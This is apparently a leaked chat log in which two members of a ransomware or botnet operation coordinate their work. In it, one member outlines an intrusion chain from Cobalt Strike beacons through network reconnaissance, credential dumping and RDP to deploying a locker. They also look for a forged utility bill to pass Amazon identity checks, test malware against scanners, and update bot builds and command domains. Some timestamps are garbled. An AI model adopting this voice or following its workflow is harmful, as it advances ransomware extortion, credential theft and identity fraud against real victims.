[20.09.21 17:26:37] angelo: no....
[20.09.21 17:27:48] angelo: I always save what you need from the correspondence, it's my tradition, I couldn't help it
[20.09.21 17:29:33] rocco: ``
 now a sec
no you don't have to crypt it, this script sends the sources to the grid, and builds the anchor file itself which you run
in the menu of the coba a submenu zakrep will appear
where you should press upload - generate - run
so upload upload uploads the source file to the bot, generate builds, run runs
it is better to open interakt on the bot before you run it, and you will get the following output

[28.09.21 20:19:04] angelo: listen, you gotta find a good quality more or less from what to do
[28.09.21 20:19:14] angelo: let's try to think of something tomorrow
[28.09.21 20:19:21] angelo: and it might work
[29.09.21 09:05:42] rocco: bro hello, and your drawer can look form any uk kiev, phone bill or bill for energy, most importantly that was visible that the full name and address?
[29.09.21 09:06:10] angelo: man, look, the question is complicated because they have not seen it in the eyes
[29.09.21 09:06:13] angelo: let's look

[29.09.21 09:07:07] rocco: I was just wondering if it'll work or not
[29.09.21 09:07:17] angelo: there is always a nuance in such things - quoitations change, you know, last year it was like this, the next year they added some small bullshit
[29.09.21 09:07:18] rocco: would solve the problem, of course
[29.09.21 09:07:30] angelo: oh, fuck!
[29.09.21 09:07:32] rocco: how would they know at amazon
[29.09.21 09:08:01] angelo: okay

[29.09.21 12:10:56] rocco: ok
[29.09.21 12:11:16] angelo: I'm sick of looking for it.)

[29.09.21 12:49:18] angelo: you should have looked for the postal receipt
[29.09.21 12:49:30] angelo: like in Russia they write it in English and the phone number

[29.09.21 16:42:41] angelo: yeah

[29.09.21 16:46:33] angelo: or you can autotest here ?
[29.09.21 16:46:57] rocco: of course, you can even run a long time ago with autotest, I think
[29.09.21 16:47:20] rocco: and you report back malware or clear
[29.09.21 16:47:34] angelo: what a piece of shit
[29.09.21 16:47:36] angelo: and no one said anything
[29.09.21 16:47:42] rocco: didn't you use it?

[11.11.21 14:58:26] rocco: ang, have you tried other crates besides our server?
[11.11.21 14:58:41] rocco: for some reason only works with our boxes
[11.11.21 15:06:10] angelo: others don't
[11.11.21 15:06:12] angelo: problems ?
[11.11.21 15:06:29] rocco: probably yes
[11.11.21 15:06:40] rocco: any server can be set
[11.11.21 15:06:42] angelo: you should have checked it, of course, but you had enough to do (
[11.11.21 15:06:50] rocco: but on the client only the ones you gave work
[11.11.21 15:07:09] rocco: I'm working on it now.
[11.11.21 15:07:12] rocco: shit

[11.11.21 15:07:28] rocco: You can use our server, too
[11.11.21 15:07:50] rocco: the main thing is not to get the server blocked
[11.11.21 15:08:16] angelo: heck, this is a question to discuss with brooks - why
[11.11.21 15:08:28] angelo: it's just a mail server
[11.11.21 15:08:33] angelo: there should be no difference
[11.11.21 15:08:41] rocco: it's not there, I just tested the whole day, I wanted to give it to work
[11.11.21 15:09:14] angelo: well, we really missed that moment
[11.11.21 15:09:33] rocco: okay, we wait for brooks
[11.11.21 15:09:42] rocco: I'll try
[11.11.21 15:09:57] rocco: something to do with protocol, maybe they block
[11.11.21 15:11:41] angelo: I think Brooks said there should be no problems with the server
[11.11.21 15:11:49] angelo: kinda made for convenience
[11.11.21 17:55:39] angelo: need your help
[11.11.21 17:55:43] angelo: can you tell me about the cob?
[11.11.21 17:56:17] rocco: davay
[11.11.21 17:56:27] angelo: not now.)
[11.11.21 17:56:31] angelo: I'll have stupid questions
[11.11.21 17:56:43] angelo: you agreed.)
[11.11.21 17:56:44] rocco: no problem
[11.11.21 17:56:49] angelo: I don't have a base
[11.11.21 17:56:58] angelo: networking.
[11.11.21 17:57:00] rocco: sure.
[11.11.21 17:57:01] angelo: space is huge
[11.11.21 17:57:10] angelo: thanks
[11.11.21 17:58:08] angelo: you know how lockers use coba ?
[11.11.21 17:58:13] angelo: logarithm them
[11.11.21 17:58:34] rocco: of course from the beginning to the end
[11.11.21 17:58:54] angelo: I signed up for pentesters if you can call it that
[11.11.21 17:59:01] angelo: but realized I'm too dumb for that
[11.11.21 17:59:37] angelo: first, do you happen to have any manuals?
[11.11.21 18:00:11] rocco: manuals for what process?
[11.11.21 18:00:23] rocco: how to lock from a to z?
[11.11.21 18:01:53] rocco: there are several processes, preparing a coba, planting meshes there, exploring the grid, domain backups sass etc, pulling cred admins
[11.11.21 18:02:46] rocco: and then, connecting by rdp to the machine from the grid with admin privileges
[11.11.21 18:03:02] rocco: and then there's the locker
[11.11.21 18:03:20] angelo: stuck on grid research
[11.11.21 18:03:28] rocco: before that there's also the info leak
[11.11.21 18:03:29] angelo: like there's a hellfire
[11.11.21 18:03:49] angelo: tell me when I can torture you
[11.11.21 18:03:49] rocco: there's better powerview tools
[11.11.21 18:03:52] angelo: I'll write it down
[11.11.21 18:04:10] angelo: want to join pentester
[11.11.21 18:04:13] rocco: okay, I'll look for manuals
[11.11.21 18:04:20] angelo: thanks a lot
[11.11.21 18:04:31] angelo: kinda give me time to learn
[11.11.21 18:04:41] rocco: it's basically done, you plug the scripts into the cob and fuck
[11.11.21 18:04:43] angelo: and they said go learn about networks...
[11.11.21 18:05:12] rocco: there basic knowledge is active directory
[11.11.21 18:05:20] angelo: yeah
[11.11.21 18:05:30] angelo: they stopped me there and sent me to learn
[11.11.21 18:06:12] rocco: it's got a lot of stuff on it
[11.11.21 18:06:24] rocco: okay, I'll take a look
[11.11.21 18:06:36] angelo: give me a hug.)
[11.11.21 18:06:46] angelo: Thanks, I'll google it.
[11.11.21 18:07:11] rocco: read about lateral movement
[11.11.21 18:07:26] rocco: it's the cornerstone of the asset directory
[11.11.21 18:07:43] angelo: okay, got it down and cleaned up
[11.11.21 18:07:53] rocco: for pentesters
[11.11.21 18:09:10] rocco: once you start reading about it, you'll get other knowledge about the asset
[11.11.21 18:10:01] rocco: there is a book by ralph hacker active directory through the eyes of hacker, maybe already posted
[11.11.21 18:10:34] rocco: it might be a bit heavy, but you'd better start with it
[11.11.21 18:11:00] angelo: okay, I'll read it.
[11.11.21 18:11:05] angelo: yeah, it's not an easy profession
[11.11.21 18:11:12] angelo: need admin base
[12/13/21/221 11:59:26] angelo: you're needed
[12/13/21 12:16:49] rocco: where?
[12/13/21 12:17:13] angelo: read tox
[12/13/21/12/221 12:17:18] angelo: my head is all messed up
[13.12.21 12:17:25] angelo: don't understand the subtleties
[13.12.21 12:17:55] angelo: before it was just the bot Update, now the subtleties came up
[13.12.21 12:18:28] angelo: you'll understand faster
[13.12.21 12:18:40] angelo: you'll figure it out
[12/13/221 12:19:28] angelo: Kod described everything
[13.12.21 12:26:25] rocco: so?
[13.12.21 12:27:37] angelo: what are my actions besides the standard bot update ?
[13.12.21 12:27:43] angelo: 1)
[13.12.21 12:27:56] angelo: 2) throw me a batkin to update Bezdaryu
[12/13/221 12:28:34] angelo: 3) I can not find the latest version of the bot (do not want to re-crypt and then try to add again)
[13.12.21 12:47:55] angelo: can you answer ?
[13.12.21 12:48:38] rocco: you're building a bot
[13.12.21 12:48:51] rocco: +1 up version

[13.12.21 12:49:06] rocco: you upgrade

```
[12/13/221 12:50:24] angelo: 11 will be okay
[12/13/21/12:50:26] rocco: ``
@set PRJ_NAME=Ramires

[12/13/221 12:50:34] angelo: +
[13.12.21 12:50:46] rocco: ``
@set PRJ_NAME=Hector
@set UPDATE_VER=12

[12/13/221 12:50:47] angelo: hector 12 was probably
[12/13/221 12:50:49] angelo: ok
[12/13/221 12:50:58] angelo: you got it right.
[12/13/221 12:51:21] angelo: so I made a build as usually
[12/13/221 12:51:45] angelo: they scared me to check the update on one bot and scared me not to change the botpack
[13.12.21 12:52:00] rocco: did you add new domains?
[13.12.21 12:52:11] angelo: Thunder adds new domains now
[13.12.21 12:52:26] angelo: in the admin area
[13.12.21 12:52:41] angelo: after I add them in the build
[13.12.21 12:54:13] angelo: IMPORTANT!!!!!!!!! for bots with FileError status - their loader can be updated, but botpack cannot
[13.12.21 12:54:25] angelo: please explain
[13.12.21 12:54:56] rocco: I don't get it now
[13.12.21 13:18:35] angelo: when you get it, please let me know
[13.12.21 14:43:36] angelo: bro, we gotta figure it out, I gotta update bots
